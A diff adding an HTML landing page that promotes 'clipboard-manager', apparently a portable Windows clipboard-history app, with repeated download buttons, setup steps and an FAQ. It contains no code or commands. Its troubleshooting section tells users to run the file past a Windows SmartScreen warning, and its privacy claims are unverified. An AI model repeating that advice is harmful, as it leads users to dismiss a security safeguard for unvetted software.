@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>clipboard-manager – Fast, Private Clipboard Manager for Windows 10/11</title>
+<meta name="description" content="clipboard-manager is a fast, private clipboard manager for Windows 10 and 11. A Win+V alternative with instant search, pinned items and history that survives restarts. One portable EXE, local only, no cloud, no telemetry.">
+<meta name="keywords" content="clipboard, clipboard-history, clipboard-manager, csharp, dotnet, keyboard-shortcuts, local-first, no-telemetry, open-source, portable, privacy, productivity, system-tray, win-v-alternative, windows, windows-10, windows-11, windows-app, windows-clipboard, wpf">
+<meta name="author" content="Santanu72159">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/Santanu72159/clipboard-manager">
+<meta property="og:type" content="website">
+<meta property="og:title" content="clipboard-manager – Fast, Private Clipboard Manager for Windows">
+<meta property="og:description" content="A Win+V alternative with instant search, pins and a history that survives restarts. One portable EXE, local only, no cloud, no telemetry.">
+<meta property="og:url" content="https://github.com/Santanu72159/clipboard-manager">
+<meta property="og:site_name" content="clipboard-manager">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="clipboard-manager – Fast, Private Clipboard Manager for Windows">
+<meta name="twitter:description" content="Instant search, pins and persistent clipboard history for Windows 10/11. Portable EXE, local only, no telemetry.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6fb;
+    color: #1f2430;
+    font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 20px 70px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 18px;
+    box-shadow: 0 10px 30px rgba(23, 32, 64, 0.08), 0 2px 6px rgba(23, 32, 64, 0.04);
+    padding: 42px 38px;
+  }
+  h1 {
+    font-size: 2.05rem;
+    line-height: 1.25;
+    margin: 0 0 18px;
+    color: #131826;
+    letter-spacing: -0.5px;
+    font-weight: 750;
+  }
+  h2 {
+    font-size: 1.38rem;
+    margin: 46px 0 14px;
+    color: #1b2133;
+    letter-spacing: -0.3px;
+    font-weight: 700;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #eceff7;
+  }
+  h3 {
+    font-size: 1.06rem;
+    margin: 26px 0 8px;
+    color: #2a3145;
+    font-weight: 650;
+  }
+  p { margin: 0 0 16px; color: #333a4d; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; color: #333a4d; }
+  li { margin-bottom: 9px; }
+  strong { color: #131826; }
+  a { color: #4f46e5; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lead {
+    font-size: 1.08rem;
+    color: #414a63;
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #6d5efc 0%, #4f46e5 55%, #3b82f6 100%);
+    color: #ffffff !important;
+    font-weight: 700;
+    font-size: 1.03rem;
+    padding: 16px 34px;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(79, 70, 229, 0.32);
+    text-decoration: none !important;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    margin: 6px 0 10px;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(79, 70, 229, 0.42);
+  }
+  .btn-note {
+    display: block;
+    font-size: 0.9rem;
+    color: #67708a;
+    margin-top: 4px;
+  }
+  .hero {
+    background: linear-gradient(160deg, #f0f0ff 0%, #eef6ff 100%);
+    border: 1px solid #e2e6f5;
+    border-radius: 16px;
+    padding: 26px 26px 22px;
+    margin: 26px 0 10px;
+    text-align: center;
+  }
+  .quote {
+    border-left: 4px solid #6d5efc;
+    background: #f7f8ff;
+    padding: 14px 20px;
+    border-radius: 0 10px 10px 0;
+    margin: 20px 0;
+    color: #3a4260;
+    font-style: italic;
+  }
+  .grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin: 18px 0 8px;
+  }
+  .tile {
+    flex: 1 1 240px;
+    background: #fafbff;
+    border: 1px solid #e8ebf7;
+    border-radius: 14px;
+    padding: 18px 20px;
+    box-shadow: 0 3px 10px rgba(23, 32, 64, 0.04);
+  }
+  .tile h3 { margin-top: 0; }
+  .tile p { margin-bottom: 0; font-size: 0.96rem; color: #4a5270; }
+  .steps {
+    counter-reset: step;
+    list-style: none;
+    padding-left: 0;
+  }
+  .steps li {
+    counter-increment: step;
+    position: relative;
+    padding-left: 52px;
+    margin-bottom: 20px;
+  }
+  .steps li::before {
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 34px;
+    height: 34px;
+    border-radius: 50%;
+    background: #4f46e5;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 0.95rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 4px 12px rgba(79, 70, 229, 0.28);
+  }
+  code {
+    background: #eef1fa;
+    padding: 2px 7px;
+    border-radius: 6px;
+    font-size: 0.9rem;
+    color: #313a5a;
+    font-family: Consolas, "Courier New", monospace;
+  }
+  .faq-q {
+    font-weight: 700;
+    color: #1b2133;
+    margin: 22px 0 6px;
+    font-size: 1rem;
+  }
+  .faq-a { margin: 0 0 8px; color: #3d4560; }
+  .divider { height: 1px; background: #edf0f9; margin: 40px 0 0; border: 0; }
+  footer {
+    text-align: center;
+    font-size: 0.86rem;
+    color: #7b839c;
+    margin-top: 30px;
+  }
+  @media (max-width: 640px) {
+    .card { padding: 26px 20px; border-radius: 14px; }
+    h1 { font-size: 1.55rem; }
+    h2 { font-size: 1.2rem; }
+    body { font-size: 16px; }
+    .btn { display: block; text-align: center; padding: 15px 20px; }
+    .wrap { padding: 22px 12px 44px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="card">
+
+    <h1>📋 clipboard-manager - Never lose a copied item again</h1>
+
+    <p class="lead">A fast, private clipboard manager for Windows 10 and 11. Think of it as the built-in Windows clipboard history, but better: instant search, pinned items, and a history that is still there after you restart your PC. One portable EXE. Local only. No cloud. No telemetry.</p>
+
+    <div class="hero">
+      <p style="margin: 0 0 14px; font-weight: 600; color: #2a2f4a;">Ready to try it? The whole download takes a minute.</p>
+      <a class="btn" href="https://github.com/Santanu72159/clipboard-manager">⬇ Get clipboard-manager</a>
+      <span class="btn-note">Visit this link to download the application.</span>
+    </div>
+
+    <h2>✨ What clipboard-manager Does for You</h2>
+    <p>Every time you press Ctrl+C, Windows keeps only the last item on the clipboard. Copy a second thing and the first is gone. That is fine for simple work, and painful when you are moving phone numbers, addresses, snippets of text, links or passwords between documents all day long.</p>
+    <p>clipboard-manager quietly remembers everything you copy. When you need something you copied ten minutes ago — or yesterday — you open the app, type a few letters, and it is right there. No more switching back to a website just to copy the same sentence again.</p>
+
+    <div class="grid">
+      <div class="tile">
+        <h3>🔎 Instant search</h3>
+        <p>Type part of a word and your item appears immediately. Searching hundreds of clips feels as quick as searching ten.</p>
+      </div>
+      <div class="tile">
+        <h3>📌 Pins that stick</h3>
+        <p>Pin the items you use every day — an email signature, a support code, a mailing address — so they never get pushed out.</p>
+      </div>
+      <div class="tile">
+        <h3>💾 Survives restarts</h3>
+        <p>Your history is saved to your own machine, so it is still there after a reboot instead of starting from zero.</p>
+      </div>
+      <div class="tile">
+        <h3>🎒 One portable EXE</h3>
+        <p>No installer wizard, no system-wide changes, no bundled extra software. Copy it, run it, remove it whenever you like.</p>
+      </div>
+    </div>
+
+    <h2>🚀 Getting Started</h2>
+    <p>You do not need to know anything about programming to use this app. If you can download a file and double-click it, you can do this.</p>
+    <ol class="steps">
+      <li><strong>Open the download page.</strong> Go to the official project page with the button below or type the address into your browser. It is the only place you should download from.</li>
+      <li><strong>Download the application.</strong> Visit this link to download the application: <a href="https://github.com/Santanu72159/clipboard-manager">https://github.com/Santanu72159/clipboard-manager</a></li>
+      <li><strong>Save the file somewhere you can find it.</strong> Your Downloads folder is fine. Because the app is portable, you can also drop it into a folder like Documents\clipboard-manager if you prefer to keep things tidy.</li>
+      <li><strong>Double-click the downloaded file to run it.</strong> The app starts right away. There is no long installation screen to sit through.</li>
+      <li><strong>Start copying as usual.</strong> Press Ctrl+C on anything you want to keep. Then open the app to see your history build up.</li>
+    </ol>
+
+    <div class="hero" style="text-align: left;">
+      <p style="margin: 0 0 12px; font-weight: 700; color: #262c46;">Download clipboard-manager</p>
+      <a class="btn" href="https://github.com/Santanu72159/clipboard-manager">⬇ Download Now</a>
+      <span class="btn-note">Visit this link to download the application.</span>
+    </div>
+
+    <h2>🖱️ How You Use It Day to Day</h2>
+    <p>There is nothing new to learn. You keep copying and pasting exactly as you always have. The difference is what happens behind the scenes.</p>
+    <ul>
+      <li><strong>Copy normally.</strong> Use Ctrl+C or right-click → Copy on any text, link or snippet. Every copy is captured automatically.</li>
+      <li><strong>Open your history when you need something back.</strong> The app lives in the system tray, so it is always a click away without cluttering your taskbar.</li>
+      <li><strong>Search instead of scrolling.</strong> Start typing what you remember about the item — a name, a few digits, part of a sentence — and the list narrows instantly.</li>
+      <li><strong>Paste with a single click.</strong> Choose the item and it goes straight back onto your clipboard, ready to paste into whatever you were working on.</li>
+      <li><strong>Pin the keepers.</strong> Anything you mark as pinned stays at the top of your list and is protected from being cleared out.</li>
+    </ul>
+    <p>Because the window opens and closes in a fraction of a second, checking your history becomes a habit rather than a chore. Most people find they use it many times an hour without thinking about it.</p>
+
+    <h2>🔐 Private by Design, Local by Default</h2>
+    <p>Your clipboard often contains things you would never want uploaded anywhere: passwords pasted from a password manager, private notes, addresses, client details, one-time codes. That is exactly why clipboard-manager was built the way it was.</p>
+    <ul>
+      <li><strong>Everything stays on your PC.</strong> Your clipboard history is stored on your own computer. There is no account, no sign-in, and no sync service in the middle.</li>
+      <li><strong>No telemetry.</strong> The app does not report what you copy, how often you use it, or anything else about you. Nothing is sent anywhere.</li>
+      <li><strong>No cloud dependency.</strong> It works on a plane, on a locked-down work laptop, or on a machine with no internet connection at all.</li>
+      <li><strong>Open source.</strong> The code is public, so anyone who wants to verify these claims can read it for themselves.</li>
+    </ul>
+    <div class="quote">A clipboard tool sees almost everything you copy. It should be the last app on your machine that phones home — and this one does not.</div>
+
+    <h2>💻 Built for Windows 10 and Windows 11</h2>
+    <p>clipboard-manager is a native Windows application, written for the desktop you actually use. It sits in the system tray, starts quickly, and stays out of the way until you call it.</p>
+    <p>It is meant as a direct replacement for the built-in Win+V clipboard panel, for people who want more from it: search that actually finds things, pins that stay put, a history that is not wiped on restart, and a portable file they can carry on a USB stick between machines.</p>
+    <p>Since the whole program is a single portable EXE, moving it is trivial. Put it on a USB drive, run it on another Windows PC, and delete the folder when you are done. There is no uninstaller to hunt for and no leftover registry clutter.</p>
+
+    <h2>🧭 Troubleshooting Tips</h2>
+    <h3>The app does not seem to be running</h3>
+    <p>Look for its icon in the system tray near the clock. Windows 11 sometimes hides new tray icons behind the small arrow — click that arrow to reveal them. You can drag the icon onto the visible tray area so it stays in view.</p>
+    <h3>Windows showed a warning when I first ran it</h3>
+    <p>Windows SmartScreen shows a caution message for many small, independently published programs that have not yet built up a download reputation. Choose the option to keep or run the file anyway if you downloaded it from the official project page linked above.</p>
+    <h3>An item I copied is not in the list</h3>
+    <p>Some password managers and banking apps deliberately block clipboard capture for security. That is expected behaviour and the app cannot override it. For everything else, normal copying should be captured right away.</p>
+    <h3>I want to clear everything</h3>
+    <p>Open the app and use the clear-history option to remove your stored clips. Since the data lives on your own machine, deleting your history removes it for good.</p>
+
+    <h2>❓ Frequently Asked Questions</h2>
+    <p class="faq-q">Do I need to install anything else first?</p>
+    <p class="faq-a">No. It is a portable application for Windows 10 and Windows 11. Download it, run it, and it is ready to use.</p>
+
+    <p class="faq-q">Is it free?</p>
+    <p class="faq-a">Yes. The project is open source and free to use.</p>
+
+    <p class="faq-q">Does my clipboard history get uploaded anywhere?</p>
+    <p class="faq-a">No. There is no cloud sync and no telemetry. Your history is stored locally on your own computer.</p>
+
+    <p class="faq-q">Will it slow down my PC?</p>
+    <p class="faq-a">The app is lightweight and sits quietly in the system tray. It only becomes active when you copy something or open it.</p>
+
+    <p class="faq-q">Can I use it alongside the Windows clipboard history?</p>
+    <p class="faq-a">Yes. They are separate tools and do not conflict. Many people simply stop using Win+V once they get used to search and pins.</p>
+
+    <p class="faq-q">How do I remove it completely?</p>
+    <p class="faq-a">Close the app, delete the file you downloaded, and clear any saved history from within the app first. Because it is portable, that is the entire uninstall process.</p>
+
+    <h2>🧩 Getting the Most Out of It</h2>
+    <ul>
+      <li>Pin your three or four most-used snippets on day one. It is the single biggest time saver.</li>
+      <li>Search by what you remember, not by what you copied. Partial words work fine.</li>
+      <li>Keep the app in your startup tray if you copy things constantly — you will never think about it again.</li>
+      <li>Clear old history once a month to keep the list focused and your stored data minimal.</li>
+    </ul>
+
+    <hr class="divider">
+    <footer>clipboard-manager · Portable clipboard history for Windows 10/11 · Local only · No telemetry · Open source</footer>
+
+  </div>
+</div>
+</body>
+</html>
